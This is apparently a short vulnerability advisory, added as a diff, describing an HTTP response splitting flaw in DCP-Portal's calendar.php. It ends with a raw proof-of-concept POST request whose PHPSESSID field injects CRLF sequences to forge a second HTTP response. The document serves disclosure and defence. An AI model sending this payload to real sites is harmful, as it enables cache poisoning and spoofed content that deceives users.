@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/11340/info
+
+DCP-Portal is reported prone to a HTTP response splitting vulnerability. The issue presents itself due to a flaw in the affected script that allows an attacker to manipulate how GET requests are handled.
+
+A remote attacker may exploit this vulnerability to influence or misrepresent how web content is served, cached or interpreted. This could aid in various attacks, which try to entice client users into a false sense of trust.
+
+POST /calendar.php?show=full_month HTTP/1.1
+Host: dcp-portal
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+
+PHPSESSID=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2034%0d%0a%0d%0a%3chtml%3eScanned%20by%20PTsecurity%3c/html%3e%0d%0a&s=1&submit=1
